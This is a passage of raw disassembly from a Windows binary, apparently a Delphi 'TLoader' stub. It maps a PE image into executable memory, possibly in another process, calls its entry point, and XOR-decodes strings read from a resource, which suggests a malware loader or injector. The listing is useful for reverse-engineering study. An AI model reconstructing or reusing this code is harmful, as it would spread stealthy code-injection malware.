  4055b6:	74 0a                	je     0x4055c2
  4055b8:	55                   	push   %ebp
  4055b9:	03 45 f4             	add    -0xc(%ebp),%eax
  4055bc:	e8 33 fd ff ff       	call   0x4052f4
  4055c1:	59                   	pop    %ecx
  4055c2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4055c5:	0f b7 40 06          	movzwl 0x6(%eax),%eax
  4055c9:	48                   	dec    %eax
  4055ca:	85 c0                	test   %eax,%eax
  4055cc:	7c 2f                	jl     0x4055fd
  4055ce:	40                   	inc    %eax
  4055cf:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4055d2:	33 db                	xor    %ebx,%ebx
  4055d4:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4055d7:	50                   	push   %eax
  4055d8:	8d 3c 9b             	lea    (%ebx,%ebx,4),%edi
  4055db:	8b 44 fe 24          	mov    0x24(%esi,%edi,8),%eax
  4055df:	e8 24 fc ff ff       	call   0x405208
  4055e4:	50                   	push   %eax
  4055e5:	8b 44 fe 08          	mov    0x8(%esi,%edi,8),%eax
  4055e9:	50                   	push   %eax
  4055ea:	8b 44 fe 0c          	mov    0xc(%esi,%edi,8),%eax
  4055ee:	03 45 f4             	add    -0xc(%ebp),%eax
  4055f1:	50                   	push   %eax
  4055f2:	e8 71 f6 ff ff       	call   0x404c68
  4055f7:	43                   	inc    %ebx
  4055f8:	ff 4d c8             	decl   -0x38(%ebp)
  4055fb:	75 d7                	jne    0x4055d4
  4055fd:	8b 45 08             	mov    0x8(%ebp),%eax
  405600:	8d 55 e0             	lea    -0x20(%ebp),%edx
  405603:	8b 0d 2c 4d 40 00    	mov    0x404d2c,%ecx
  405609:	e8 ee e9 ff ff       	call   0x403ffc
  40560e:	33 c0                	xor    %eax,%eax
  405610:	5a                   	pop    %edx
  405611:	59                   	pop    %ecx
  405612:	59                   	pop    %ecx
  405613:	64 89 10             	mov    %edx,%fs:(%eax)
  405616:	68 31 56 40 00       	push   $0x405631
  40561b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40561e:	8b 15 2c 4d 40 00    	mov    0x404d2c,%edx
  405624:	e8 7b e7 ff ff       	call   0x403da4
  405629:	c3                   	ret
  40562a:	e9 95 db ff ff       	jmp    0x4031c4
  40562f:	eb ea                	jmp    0x40561b
  405631:	5f                   	pop    %edi
  405632:	5e                   	pop    %esi
  405633:	5b                   	pop    %ebx
  405634:	8b e5                	mov    %ebp,%esp
  405636:	5d                   	pop    %ebp
  405637:	c2 04 00             	ret    $0x4
  40563a:	8b c0                	mov    %eax,%eax
  40563c:	55                   	push   %ebp
  40563d:	8b ec                	mov    %esp,%ebp
  40563f:	83 c4 f8             	add    $0xfffffff8,%esp
  405642:	8b 45 08             	mov    0x8(%ebp),%eax
  405645:	8b 10                	mov    (%eax),%edx
  405647:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40564a:	8b 50 04             	mov    0x4(%eax),%edx
  40564d:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405650:	31 c0                	xor    %eax,%eax
  405652:	50                   	push   %eax
  405653:	6a 01                	push   $0x1
  405655:	ff 75 f8             	push   -0x8(%ebp)
  405658:	ff 55 fc             	call   *-0x4(%ebp)
  40565b:	59                   	pop    %ecx
  40565c:	59                   	pop    %ecx
  40565d:	5d                   	pop    %ebp
  40565e:	c2 04 00             	ret    $0x4
  405661:	8d 40 00             	lea    0x0(%eax),%eax
  405664:	55                   	push   %ebp
  405665:	8b ec                	mov    %esp,%ebp
  405667:	83 c4 d4             	add    $0xffffffd4,%esp
  40566a:	53                   	push   %ebx
  40566b:	56                   	push   %esi
  40566c:	57                   	push   %edi
  40566d:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405670:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405673:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405676:	8b 15 2c 4d 40 00    	mov    0x404d2c,%edx
  40567c:	e8 5f e6 ff ff       	call   0x403ce0
  405681:	33 c0                	xor    %eax,%eax
  405683:	55                   	push   %ebp
  405684:	68 75 57 40 00       	push   $0x405775
  405689:	64 ff 30             	push   %fs:(%eax)
  40568c:	64 89 20             	mov    %esp,%fs:(%eax)
  40568f:	c6 45 f7 00          	movb   $0x0,-0x9(%ebp)
  405693:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405696:	33 d2                	xor    %edx,%edx
  405698:	52                   	push   %edx
  405699:	50                   	push   %eax
  40569a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40569d:	8b 40 3c             	mov    0x3c(%eax),%eax
  4056a0:	99                   	cltd
  4056a1:	03 04 24             	add    (%esp),%eax
  4056a4:	13 54 24 04          	adc    0x4(%esp),%edx
  4056a8:	83 c4 08             	add    $0x8,%esp
  4056ab:	8b f8                	mov    %eax,%edi
  4056ad:	be 00 00 00 10       	mov    $0x10000000,%esi
  4056b2:	81 c6 00 00 01 00    	add    $0x10000,%esi
  4056b8:	6a 40                	push   $0x40
  4056ba:	68 00 30 00 00       	push   $0x3000
  4056bf:	8b 47 50             	mov    0x50(%edi),%eax
  4056c2:	50                   	push   %eax
  4056c3:	8b 47 34             	mov    0x34(%edi),%eax
  4056c6:	03 c6                	add    %esi,%eax
  4056c8:	50                   	push   %eax
  4056c9:	e8 82 f5 ff ff       	call   0x404c50
  4056ce:	8b d8                	mov    %eax,%ebx
  4056d0:	85 db                	test   %ebx,%ebx
  4056d2:	74 29                	je     0x4056fd
  4056d4:	68 00 80 00 00       	push   $0x8000
  4056d9:	6a 00                	push   $0x0
  4056db:	53                   	push   %ebx
  4056dc:	e8 7f f5 ff ff       	call   0x404c60
  4056e1:	6a 40                	push   $0x40
  4056e3:	68 00 30 00 00       	push   $0x3000
  4056e8:	8b 47 50             	mov    0x50(%edi),%eax
  4056eb:	50                   	push   %eax
  4056ec:	8b 47 34             	mov    0x34(%edi),%eax
  4056ef:	03 c6                	add    %esi,%eax
  4056f1:	50                   	push   %eax
  4056f2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4056f5:	50                   	push   %eax
  4056f6:	e8 5d f5 ff ff       	call   0x404c58
  4056fb:	8b d8                	mov    %eax,%ebx
  4056fd:	85 db                	test   %ebx,%ebx
  4056ff:	75 08                	jne    0x405709
  405701:	81 fe 00 00 00 30    	cmp    $0x30000000,%esi
  405707:	76 a9                	jbe    0x4056b2
  405709:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40570c:	50                   	push   %eax
  40570d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405710:	8b d3                	mov    %ebx,%edx
  405712:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405715:	e8 16 fd ff ff       	call   0x405430
  40571a:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40571d:	85 c0                	test   %eax,%eax
  40571f:	74 38                	je     0x405759
  405721:	89 45 ec             	mov    %eax,-0x14(%ebp)
  405724:	8b 55 e0             	mov    -0x20(%ebp),%edx
  405727:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40572a:	8d 55 e8             	lea    -0x18(%ebp),%edx
  40572d:	52                   	push   %edx
  40572e:	8b 55 d8             	mov    -0x28(%ebp),%edx
  405731:	52                   	push   %edx
  405732:	50                   	push   %eax
  405733:	53                   	push   %ebx
  405734:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405737:	50                   	push   %eax
  405738:	e8 43 f5 ff ff       	call   0x404c80
  40573d:	6a 08                	push   $0x8
  40573f:	6a 00                	push   $0x0
  405741:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405744:	ba 3c 56 40 00       	mov    $0x40563c,%edx
  405749:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40574c:	e8 cb f6 ff ff       	call   0x404e1c
  405751:	85 c0                	test   %eax,%eax
  405753:	74 04                	je     0x405759
  405755:	c6 45 f7 01          	movb   $0x1,-0x9(%ebp)
  405759:	33 c0                	xor    %eax,%eax
  40575b:	5a                   	pop    %edx
  40575c:	59                   	pop    %ecx
  40575d:	59                   	pop    %ecx
  40575e:	64 89 10             	mov    %edx,%fs:(%eax)
  405761:	68 7c 57 40 00       	push   $0x40577c
  405766:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405769:	8b 15 2c 4d 40 00    	mov    0x404d2c,%edx
  40576f:	e8 30 e6 ff ff       	call   0x403da4
  405774:	c3                   	ret
  405775:	e9 4a da ff ff       	jmp    0x4031c4
  40577a:	eb ea                	jmp    0x405766
  40577c:	8a 45 f7             	mov    -0x9(%ebp),%al
  40577f:	5f                   	pop    %edi
  405780:	5e                   	pop    %esi
  405781:	5b                   	pop    %ebx
  405782:	8b e5                	mov    %ebp,%esp
  405784:	5d                   	pop    %ebp
  405785:	c3                   	ret
  405786:	8b c0                	mov    %eax,%eax
  405788:	55                   	push   %ebp
  405789:	8b ec                	mov    %esp,%ebp
  40578b:	33 c0                	xor    %eax,%eax
  40578d:	55                   	push   %ebp
  40578e:	68 ad 57 40 00       	push   $0x4057ad
  405793:	64 ff 30             	push   %fs:(%eax)
  405796:	64 89 20             	mov    %esp,%fs:(%eax)
  405799:	ff 05 64 b6 40 00    	incl   0x40b664
  40579f:	33 c0                	xor    %eax,%eax
  4057a1:	5a                   	pop    %edx
  4057a2:	59                   	pop    %ecx
  4057a3:	59                   	pop    %ecx
  4057a4:	64 89 10             	mov    %edx,%fs:(%eax)
  4057a7:	68 b4 57 40 00       	push   $0x4057b4
  4057ac:	c3                   	ret
  4057ad:	e9 12 da ff ff       	jmp    0x4031c4
  4057b2:	eb f8                	jmp    0x4057ac
  4057b4:	5d                   	pop    %ebp
  4057b5:	c3                   	ret
  4057b6:	8b c0                	mov    %eax,%eax
  4057b8:	83 2d 64 b6 40 00 01 	subl   $0x1,0x40b664
  4057bf:	c3                   	ret
  4057c0:	c4 57 40             	les    0x40(%edi),%edx
  4057c3:	00 11                	add    %dl,(%ecx)
  4057c5:	06                   	push   %es
  4057c6:	53                   	push   %ebx
  4057c7:	41                   	inc    %ecx
  4057c8:	72 72                	jb     0x40583c
  4057ca:	61                   	popa
  4057cb:	79 04                	jns    0x4057d1
  4057cd:	00 00                	add    %al,(%eax)
  4057cf:	00 00                	add    %al,(%eax)
  4057d1:	10 40 00             	adc    %al,0x0(%eax)
  4057d4:	48                   	dec    %eax
  4057d5:	00 00                	add    %al,(%eax)
  4057d7:	00 00                	add    %al,(%eax)
  4057d9:	10 40 00             	adc    %al,0x0(%eax)
  4057dc:	07                   	pop    %es
  4057dd:	45                   	inc    %ebp
  4057de:	64 69 74 53 76 72 30 	imul   $0x40583072,%fs:0x76(%ebx,%edx,2),%esi
  4057e5:	58 40 
	...
  4057ef:	00 30                	add    %dh,(%eax)
  4057f1:	58                   	pop    %eax
  4057f2:	40                   	inc    %eax
	...
  405803:	00 42 58             	add    %al,0x58(%edx)
  405806:	40                   	inc    %eax
  405807:	00 08                	add    %cl,(%eax)
  405809:	00 00                	add    %al,(%eax)
  40580b:	00 0c 10             	add    %cl,(%eax,%edx,1)
  40580e:	40                   	inc    %eax
  40580f:	00 f4                	add    %dh,%ah
  405811:	2e 40                	cs inc %eax
  405813:	00 00                	add    %al,(%eax)
  405815:	2f                   	das
  405816:	40                   	inc    %eax
  405817:	00 04 2f             	add    %al,(%edi,%ebp,1)
  40581a:	40                   	inc    %eax
  40581b:	00 08                	add    %cl,(%eax)
  40581d:	2f                   	das
  40581e:	40                   	inc    %eax
  40581f:	00 fc                	add    %bh,%ah
  405821:	2e 40                	cs inc %eax
  405823:	00 d8                	add    %bl,%al
  405825:	2d 40 00 f4 2d       	sub    $0x2df40040,%eax
  40582a:	40                   	inc    %eax
  40582b:	00 30                	add    %dh,(%eax)
  40582d:	2e 40                	cs inc %eax
  40582f:	00 0e                	add    %cl,(%esi)
  405831:	00 00                	add    %al,(%eax)
  405833:	00 00                	add    %al,(%eax)
  405835:	00 01                	add    %al,(%ecx)
  405837:	00 00                	add    %al,(%eax)
  405839:	00 c0                	add    %al,%al
  40583b:	57                   	push   %edi
  40583c:	40                   	inc    %eax
  40583d:	00 04 00             	add    %al,(%eax,%eax,1)
  405840:	00 00                	add    %al,(%eax)
  405842:	07                   	pop    %es
  405843:	54                   	push   %esp
  405844:	4c                   	dec    %esp
  405845:	6f                   	outsl  %ds:(%esi),(%dx)
  405846:	61                   	popa
  405847:	64 65 72 8b          	fs gs jb 0x4057d6
  40584b:	c0 55 8b ec          	rclb   $0xec,-0x75(%ebp)
  40584f:	51                   	push   %ecx
  405850:	53                   	push   %ebx
  405851:	56                   	push   %esi
  405852:	57                   	push   %edi
  405853:	8b fa                	mov    %edx,%edi
  405855:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405858:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40585b:	e8 54 e2 ff ff       	call   0x403ab4
  405860:	33 c0                	xor    %eax,%eax
  405862:	55                   	push   %ebp
  405863:	68 bb 58 40 00       	push   $0x4058bb
  405868:	64 ff 30             	push   %fs:(%eax)
  40586b:	64 89 20             	mov    %esp,%fs:(%eax)
  40586e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405871:	e8 4e e0 ff ff       	call   0x4038c4
  405876:	8b f0                	mov    %eax,%esi
  405878:	85 f6                	test   %esi,%esi
  40587a:	7e 1f                	jle    0x40589b
  40587c:	bb 01 00 00 00       	mov    $0x1,%ebx
  405881:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405884:	e8 93 e2 ff ff       	call   0x403b1c
  405889:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40588c:	8a 54 1a ff          	mov    -0x1(%edx,%ebx,1),%dl
  405890:	80 f2 bc             	xor    $0xbc,%dl
  405893:	88 54 18 ff          	mov    %dl,-0x1(%eax,%ebx,1)
  405897:	43                   	inc    %ebx
  405898:	4e                   	dec    %esi
  405899:	75 e6                	jne    0x405881
  40589b:	8b c7                	mov    %edi,%eax
  40589d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4058a0:	e8 ff de ff ff       	call   0x4037a4
  4058a5:	33 c0                	xor    %eax,%eax
  4058a7:	5a                   	pop    %edx
  4058a8:	59                   	pop    %ecx
  4058a9:	59                   	pop    %ecx
  4058aa:	64 89 10             	mov    %edx,%fs:(%eax)
  4058ad:	68 c2 58 40 00       	push   $0x4058c2
  4058b2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4058b5:	e8 96 de ff ff       	call   0x403750
  4058ba:	c3                   	ret
  4058bb:	e9 04 d9 ff ff       	jmp    0x4031c4
  4058c0:	eb f0                	jmp    0x4058b2
  4058c2:	5f                   	pop    %edi
  4058c3:	5e                   	pop    %esi
  4058c4:	5b                   	pop    %ebx
  4058c5:	59                   	pop    %ecx
  4058c6:	5d                   	pop    %ebp
  4058c7:	c3                   	ret
  4058c8:	55                   	push   %ebp
  4058c9:	8b ec                	mov    %esp,%ebp
  4058cb:	83 c4 f0             	add    $0xfffffff0,%esp
  4058ce:	53                   	push   %ebx
  4058cf:	56                   	push   %esi
  4058d0:	57                   	push   %edi
  4058d1:	33 db                	xor    %ebx,%ebx
  4058d3:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4058d6:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4058d9:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4058dc:	8b fa                	mov    %edx,%edi
  4058de:	8b d8                	mov    %eax,%ebx
  4058e0:	33 c0                	xor    %eax,%eax
  4058e2:	55                   	push   %ebp
  4058e3:	68 c1 59 40 00       	push   $0x4059c1
  4058e8:	64 ff 30             	push   %fs:(%eax)
  4058eb:	64 89 20             	mov    %esp,%fs:(%eax)
  4058ee:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4058f1:	8b d3                	mov    %ebx,%edx
  4058f3:	e8 f0 de ff ff       	call   0x4037e8
  4058f8:	33 f6                	xor    %esi,%esi
  4058fa:	8b c7                	mov    %edi,%eax
  4058fc:	e8 c3 df ff ff       	call   0x4038c4
  405901:	48                   	dec    %eax
  405902:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405905:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405908:	8b c7                	mov    %edi,%eax
  40590a:	e8 9d e2 ff ff       	call   0x403bac
  40590f:	8b d8                	mov    %eax,%ebx
  405911:	85 db                	test   %ebx,%ebx
  405913:	74 44                	je     0x405959
  405915:	46                   	inc    %esi
  405916:	56                   	push   %esi
  405917:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40591a:	b9 01 00 00 00       	mov    $0x1,%ecx
  40591f:	8b 15 c0 57 40 00    	mov    0x4057c0,%edx
  405925:	e8 0e ed ff ff       	call   0x404638
  40592a:	83 c4 04             	add    $0x4,%esp
  40592d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405930:	8d 44 b0 fc          	lea    -0x4(%eax,%esi,4),%eax
  405934:	50                   	push   %eax
  405935:	8b cb                	mov    %ebx,%ecx
  405937:	49                   	dec    %ecx
  405938:	ba 01 00 00 00       	mov    $0x1,%edx
  40593d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405940:	e8 df e1 ff ff       	call   0x403b24
  405945:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405948:	03 cb                	add    %ebx,%ecx
  40594a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40594d:	ba 01 00 00 00       	mov    $0x1,%edx
  405952:	e8 0d e2 ff ff       	call   0x403b64
  405957:	eb ac                	jmp    0x405905
  405959:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40595c:	e8 63 df ff ff       	call   0x4038c4
  405961:	85 c0                	test   %eax,%eax
  405963:	7e 27                	jle    0x40598c
  405965:	46                   	inc    %esi
  405966:	56                   	push   %esi
  405967:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40596a:	b9 01 00 00 00       	mov    $0x1,%ecx
  40596f:	8b 15 c0 57 40 00    	mov    0x4057c0,%edx
  405975:	e8 be ec ff ff       	call   0x404638
  40597a:	83 c4 04             	add    $0x4,%esp
  40597d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405980:	8d 44 b0 fc          	lea    -0x4(%eax,%esi,4),%eax
  405984:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405987:	e8 18 de ff ff       	call   0x4037a4
  40598c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40598f:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405992:	8b 0d c0 57 40 00    	mov    0x4057c0,%ecx
  405998:	e8 e3 ec ff ff       	call   0x404680
  40599d:	33 c0                	xor    %eax,%eax
  40599f:	5a                   	pop    %edx
  4059a0:	59                   	pop    %ecx
  4059a1:	59                   	pop    %ecx
  4059a2:	64 89 10             	mov    %edx,%fs:(%eax)
  4059a5:	68 c8 59 40 00       	push   $0x4059c8
  4059aa:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4059ad:	8b 15 c0 57 40 00    	mov    0x4057c0,%edx
  4059b3:	e8 8c ec ff ff       	call   0x404644
  4059b8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4059bb:	e8 90 dd ff ff       	call   0x403750
  4059c0:	c3                   	ret
  4059c1:	e9 fe d7 ff ff       	jmp    0x4031c4
  4059c6:	eb e2                	jmp    0x4059aa
  4059c8:	5f                   	pop    %edi
  4059c9:	5e                   	pop    %esi
  4059ca:	5b                   	pop    %ebx
  4059cb:	8b e5                	mov    %ebp,%esp
  4059cd:	5d                   	pop    %ebp
  4059ce:	c3                   	ret
  4059cf:	90                   	nop
  4059d0:	53                   	push   %ebx
  4059d1:	56                   	push   %esi
  4059d2:	57                   	push   %edi
  4059d3:	55                   	push   %ebp
  4059d4:	8b e8                	mov    %eax,%ebp
  4059d6:	6a 0a                	push   $0xa
  4059d8:	68 38 5a 40 00       	push   $0x405a38
  4059dd:	a1 50 b6 40 00       	mov    0x40b650,%eax
  4059e2:	50                   	push   %eax
  4059e3:	e8 e0 f1 ff ff       	call   0x404bc8
  4059e8:	8b d8                	mov    %eax,%ebx
  4059ea:	53                   	push   %ebx
  4059eb:	a1 50 b6 40 00       	mov    0x40b650,%eax
  4059f0:	50                   	push   %eax
  4059f1:	e8 4a f2 ff ff       	call   0x404c40
  4059f6:	8b f8                	mov    %eax,%edi
  4059f8:	53                   	push   %ebx
  4059f9:	a1 50 b6 40 00       	mov    0x40b650,%eax
  4059fe:	50                   	push   %eax
  4059ff:	e8 0c f2 ff ff       	call   0x404c10
  405a04:	8b d8                	mov    %eax,%ebx
  405a06:	53                   	push   %ebx
  405a07:	e8 0c f2 ff ff       	call   0x404c18
  405a0c:	8b f0                	mov    %eax,%esi
  405a0e:	85 f6                	test   %esi,%esi
  405a10:	74 20                	je     0x405a32
  405a12:	8b d7                	mov    %edi,%edx
  405a14:	4a                   	dec    %edx
  405a15:	8b c5                	mov    %ebp,%eax
  405a17:	e8 d8 e1 ff ff       	call   0x403bf4
  405a1c:	8b c5                	mov    %ebp,%eax
  405a1e:	e8 f9 e0 ff ff       	call   0x403b1c
  405a23:	8b cf                	mov    %edi,%ecx
  405a25:	8b d6                	mov    %esi,%edx
  405a27:	e8 84 f2 ff ff       	call   0x404cb0
  405a2c:	53                   	push   %ebx
  405a2d:	e8 9e f1 ff ff       	call   0x404bd0
  405a32:	5d                   	pop    %ebp
  405a33:	5f                   	pop    %edi
  405a34:	5e                   	pop    %esi
  405a35:	5b                   	pop    %ebx
  405a36:	c3                   	ret
  405a37:	00 58 58             	add    %bl,0x58(%eax)
  405a3a:	2d 58 58 2d 58       	sub    $0x582d5858,%eax
  405a3f:	58                   	pop    %eax
  405a40:	2d 58 58 00 55       	sub    $0x55005858,%eax
  405a45:	8b ec                	mov    %esp,%ebp
  405a47:	6a 00                	push   $0x0
  405a49:	6a 00                	push   $0x0
  405a4b:	6a 00                	push   $0x0
  405a4d:	53                   	push   %ebx
  405a4e:	56                   	push   %esi
  405a4f:	57                   	push   %edi
  405a50:	8b f0                	mov    %eax,%esi
  405a52:	33 c0                	xor    %eax,%eax
  405a54:	55                   	push   %ebp
  405a55:	68 0b 5b 40 00       	push   $0x405b0b
  405a5a:	64 ff 30             	push   %fs:(%eax)
  405a5d:	64 89 20             	mov    %esp,%fs:(%eax)
  405a60:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405a63:	e8 68 ff ff ff       	call   0x4059d0
  405a68:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405a6b:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405a6e:	ba 24 5b 40 00       	mov    $0x405b24,%edx
  405a73:	e8 50 fe ff ff       	call   0x4058c8
  405a78:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405a7b:	8d 46 04             	lea    0x4(%esi),%eax
  405a7e:	8b 0d c0 57 40 00    	mov    0x4057c0,%ecx
  405a84:	e8 f7 eb ff ff       	call   0x404680
  405a89:	8b 46 04             	mov    0x4(%esi),%eax
  405a8c:	e8 d3 e9 ff ff       	call   0x404464
  405a91:	8b f8                	mov    %eax,%edi
  405a93:	85 ff                	test   %edi,%edi
  405a95:	7c 4b                	jl     0x405ae2
  405a97:	47                   	inc    %edi
  405a98:	33 db                	xor    %ebx,%ebx
  405a9a:	8b 46 04             	mov    0x4(%esi),%eax
  405a9d:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  405aa1:	74 30                	je     0x405ad3
  405aa3:	8b 46 04             	mov    0x4(%esi),%eax
  405aa6:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  405aa9:	ba 38 5b 40 00       	mov    $0x405b38,%edx
  405aae:	e8 5d df ff ff       	call   0x403a10
  405ab3:	74 1e                	je     0x405ad3
  405ab5:	8d 55 f4             	lea    -0xc(%ebp),%edx
  405ab8:	8b 46 04             	mov    0x4(%esi),%eax
  405abb:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  405abe:	e8 89 fd ff ff       	call   0x40584c
  405ac3:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405ac6:	8b 46 04             	mov    0x4(%esi),%eax
  405ac9:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  405acc:	e8 d3 dc ff ff       	call   0x4037a4
  405ad1:	eb 0b                	jmp    0x405ade
  405ad3:	8b 46 04             	mov    0x4(%esi),%eax
  405ad6:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  405ad9:	e8 72 dc ff ff       	call   0x403750
  405ade:	43                   	inc    %ebx
  405adf:	4f                   	dec    %edi
  405ae0:	75 b8                	jne    0x405a9a
  405ae2:	33 c0                	xor    %eax,%eax
  405ae4:	5a                   	pop    %edx
  405ae5:	59                   	pop    %ecx
  405ae6:	59                   	pop    %ecx
  405ae7:	64 89 10             	mov    %edx,%fs:(%eax)
  405aea:	68 12 5b 40 00       	push   $0x405b12
  405aef:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405af2:	ba 02 00 00 00       	mov    $0x2,%edx
  405af7:	e8 78 dc ff ff       	call   0x403774
  405afc:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405aff:	8b 15 c0 57 40 00    	mov    0x4057c0,%edx
  405b05:	e8 3a eb ff ff       	call   0x404644
  405b0a:	c3                   	ret
  405b0b:	e9 b4 d6 ff ff       	jmp    0x4031c4
  405b10:	eb dd                	jmp    0x405aef
  405b12:	5f                   	pop    %edi
  405b13:	5e                   	pop    %esi
  405b14:	5b                   	pop    %ebx
  405b15:	8b e5                	mov    %ebp,%esp
  405b17:	5d                   	pop    %ebp
  405b18:	c3                   	ret
  405b19:	00 00                	add    %al,(%eax)
  405b1b:	00 ff                	add    %bh,%bh
  405b1d:	ff                   	(bad)
  405b1e:	ff                   	(bad)
  405b1f:	ff 09                	decl   (%ecx)
  405b21:	00 00                	add    %al,(%eax)
  405b23:	00 23                	add    %ah,(%ebx)
  405b25:	23 23                	and    (%ebx),%esp
  405b27:	23 40 23             	and    0x23(%eax),%eax
  405b2a:	23 23                	and    (%ebx),%esp
  405b2c:	23 00                	and    (%eax),%eax
  405b2e:	00 00                	add    %al,(%eax)
  405b30:	ff                   	(bad)
  405b31:	ff                   	(bad)
  405b32:	ff                   	(bad)
  405b33:	ff 01                	incl   (%ecx)
  405b35:	00 00                	add    %al,(%eax)
  405b37:	00 20                	add    %ah,(%eax)
  405b39:	00 00                	add    %al,(%eax)
  405b3b:	00 55 8b             	add    %dl,-0x75(%ebp)
  405b3e:	ec                   	in     (%dx),%al
  405b3f:	33 c0                	xor    %eax,%eax
  405b41:	55                   	push   %ebp
  405b42:	68 61 5b 40 00       	push   $0x405b61
  405b47:	64 ff 30             	push   %fs:(%eax)
  405b4a:	64 89 20             	mov    %esp,%fs:(%eax)
  405b4d:	ff 05 68 b6 40 00    	incl   0x40b668
  405b53:	33 c0                	xor    %eax,%eax
  405b55:	5a                   	pop    %edx
  405b56:	59                   	pop    %ecx
  405b57:	59                   	pop    %ecx
  405b58:	64 89 10             	mov    %edx,%fs:(%eax)
  405b5b:	68 68 5b 40 00       	push   $0x405b68
  405b60:	c3                   	ret
  405b61:	e9 5e d6 ff ff       	jmp    0x4031c4
  405b66:	eb f8                	jmp    0x405b60
  405b68:	5d                   	pop    %ebp
  405b69:	c3                   	ret
  405b6a:	8b c0                	mov    %eax,%eax
  405b6c:	83 2d 68 b6 40 00 01 	subl   $0x1,0x40b668
  405b73:	c3                   	ret
  405b74:	53                   	push   %ebx
  405b75:	56                   	push   %esi
  405b76:	57                   	push   %edi
  405b77:	b2 01                	mov    $0x1,%dl
  405b79:	a1 e4 57 40 00       	mov    0x4057e4,%eax
  405b7e:	e8 8d d2 ff ff       	call   0x402e10
  405b83:	8b f8                	mov    %eax,%edi
  405b85:	8b c7                	mov    %edi,%eax
  405b87:	e8 b8 fe ff ff       	call   0x405a44
  405b8c:	33 f6                	xor    %esi,%esi
  405b8e:	bb 6c b6 40 00       	mov    $0x40b66c,%ebx
  405b93:	8b c3                	mov    %ebx,%eax
  405b95:	8b 57 04             	mov    0x4(%edi),%edx
  405b98:	8b 14 b2             	mov    (%edx,%esi,4),%edx
  405b9b:	e8 04 dc ff ff       	call   0x4037a4
  405ba0:	46                   	inc    %esi
  405ba1:	83 c3 04             	add    $0x4,%ebx
  405ba4:	83 fe 65             	cmp    $0x65,%esi
  405ba7:	75 ea                	jne    0x405b93
  405ba9:	8b c7                	mov    %edi,%eax
  405bab:	e8 90 d2 ff ff       	call   0x402e40
  405bb0:	5f                   	pop    %edi
  405bb1:	5e                   	pop    %esi
  405bb2:	5b                   	pop    %ebx
  405bb3:	c3                   	ret
  405bb4:	55                   	push   %ebp
  405bb5:	8b ec                	mov    %esp,%ebp
  405bb7:	33 c0                	xor    %eax,%eax
  405bb9:	55                   	push   %ebp
  405bba:	68 00 5c 40 00       	push   $0x405c00
  405bbf:	64 ff 30             	push   %fs:(%eax)
  405bc2:	64 89 20             	mov    %esp,%fs:(%eax)
  405bc5:	ff 05 00 b8 40 00    	incl   0x40b800
  405bcb:	75 25                	jne    0x405bf2
  405bcd:	b8 04 b8 40 00       	mov    $0x40b804,%eax
  405bd2:	8b 15 c0 57 40 00    	mov    0x4057c0,%edx
  405bd8:	e8 67 ea ff ff       	call   0x404644
  405bdd:	b8 6c b6 40 00       	mov    $0x40b66c,%eax
  405be2:	b9 65 00 00 00       	mov    $0x65,%ecx
  405be7:	8b 15 00 10 40 00    	mov    0x401000,%edx
  405bed:	e8 fe e1 ff ff       	call   0x403df0
  405bf2:	33 c0                	xor    %eax,%eax
  405bf4:	5a                   	pop    %edx
  405bf5:	59                   	pop    %ecx
  405bf6:	59                   	pop    %ecx
  405bf7:	64 89 10             	mov    %edx,%fs:(%eax)
  405bfa:	68 07 5c 40 00       	push   $0x405c07
  405bff:	c3                   	ret
  405c00:	e9 bf d5 ff ff       	jmp    0x4031c4
  405c05:	eb f8                	jmp    0x405bff
